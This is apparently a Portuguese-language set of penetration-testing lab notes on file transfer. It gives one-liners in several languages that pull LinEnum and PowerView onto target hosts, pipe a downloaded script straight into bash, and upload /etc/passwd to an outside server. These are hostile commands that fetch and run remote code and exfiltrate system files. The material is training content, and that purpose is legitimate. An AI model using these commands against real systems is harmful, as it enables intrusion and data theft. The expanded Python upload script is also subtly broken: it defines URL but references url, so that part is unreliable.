
## Pyhton

Python é uma linguagem de programação popular. Atualmente, a versão 3 é suportada, mas podemos encontrar servidores onde a versão 2.7 do Python ainda existe. `Python`pode executar one-liners a partir de uma linha de comando do sistema operacional usando a opção `-c`. Vamos ver alguns exemplos:
#### Python 2 - Baixar
```shell-session
NycolasES6@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

#### Python 3 - Baixar
```shell-session
NycolasES6@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

## PHP
É comum encontrar diferentes linguagens de programação instaladas nas máquinas alvo, especialmente em distribuições Linux, onde linguagens como Python, PHP, Perl e Ruby são frequentemente disponíveis.

No Windows, embora seja menos comum, também é possível encontrar linguagens instaladas e usar aplicativos padrão como `cscript` e `mshta` para executar JavaScript ou VBScript. O JavaScript também pode ser executado em hosts Linux.

Com cerca de 700 linguagens de programação disponíveis, qualquer uma delas pode ser usada para criar código que baixe, carregue ou execute instruções no sistema operacional. Esta seção fornecerá exemplos usando algumas dessas linguagens comuns.

#### Download do PHP com File_get_contents()
```shell-session
NycolasES6@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

Uma alternativa para `file_get_contents()`and `file_put_contents()`é o [módulo fopen()](https://www.php.net/manual/en/function.fopen.php) . Podemos usar esse módulo para abrir uma URL, ler seu conteúdo e salvá-lo em um arquivo.

#### Download do PHP com Fopen()
```shell-session
NycolasES6@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote = fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

Também podemos enviar o conteúdo baixado para um pipe, semelhante ao exemplo sem arquivo que executamos na seção anterior usando cURL e wget.

#### PHP Baixe um arquivo e envie-o para o Bash
```shell-session
NycolasES6@htb[/htb]$ php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

## Outras linguagens
`Ruby`e `Perl`são outras linguagens populares que também podem ser usadas para transferir arquivos. Essas duas linguagens de programação também suportam a execução de one-liners a partir de uma linha de comando do sistema operacional usando a opção `-e`.

#### Ruby - Baixar um arquivo
```shell-session
NycolasES6@htb[/htb]$ ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

#### Perl - Baixar um arquivo
```shell-session
NycolasES6@htb[/htb]$ perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

## JavaScript
JavaScript é uma linguagem de script ou programação que permite implementar recursos complexos em páginas da web. Assim como outras linguagens de programação, podemos usá-lo para muitas coisas diferentes.

O código JavaScript a seguir é baseado [neste](https://superuser.com/questions/25538/how-to-download-files-from-command-line-in-windows-like-wget-or-curl/373068) post, e podemos baixar um arquivo usando-o. Criaremos um arquivo chamado `wget.js`e salvaremos o seguinte conteúdo:

```javascript
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

Podemos usar o seguinte comando em um prompt de comando do Windows ou em um terminal do PowerShell para executar nosso código JavaScript e baixar um arquivo.

#### Baixar um arquivo usando JavaScript e cscript.exe
```cmd-session
C:\htb> cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

## VBScript
[VBScript](https://en.wikipedia.org/wiki/VBScript) ("Microsoft Visual Basic Scripting Edition") é uma linguagem de script ativo desenvolvida pela Microsoft que é modelada no Visual Basic. O VBScript foi instalado por padrão em todas as versões desktop do Microsoft Windows desde o Windows 98.

O seguinte exemplo de VBScript pode ser usado com base nisso [.](https://stackoverflow.com/questions/2973136/download-a-file-with-vbs) Criaremos um arquivo chamado `wget.vbs`e salvaremos o seguinte conteúdo:

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

Podemos usar o seguinte comando em um prompt de comando do Windows ou terminal do PowerShell para executar nosso código VBScript e baixar um arquivo.

#### Baixar um arquivo usando VBScript e cscript.exe
```cmd-session
C:\htb> cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

## Operações de upload usando Python3
Se quisermos fazer upload de um arquivo, precisamos entender as funções em uma linguagem de programação específica para executar a operação de upload. O [módulo Python3 requests](https://pypi.org/project/requests/) permite que você envie requisições HTTP (GET, POST, PUT, etc.) usando Python. Podemos usar o código a seguir se quisermos fazer upload de um arquivo para nosso Python3 [uploadserver](https://github.com/Densaugeo/uploadserver) .

#### Iniciando o módulo Python uploadserver
```shell-session
NycolasES6@htb[/htb]$ python3 -m uploadserver 

File upload available at /upload
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

#### Carregando um arquivo usando um Python One-liner
```shell-session
NycolasES6@htb[/htb]$ python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

Vamos dividir esta frase em várias linhas para entender melhor cada parte.

```python
# To use the requests function, we need to import the module first.
import requests 

# Define the target URL where we will upload the file.
URL = "http://192.168.49.128:8000/upload"

# Define the file we want to read, open it and save it in a variable.
file = open("/etc/passwd","rb")

# Use a requests POST request to upload the file. 
r = requests.post(url,files={"files":file})
```

Podemos fazer o mesmo com qualquer outra linguagem de programação. Uma boa prática é escolher uma e tentar construir um programa de upload.



























































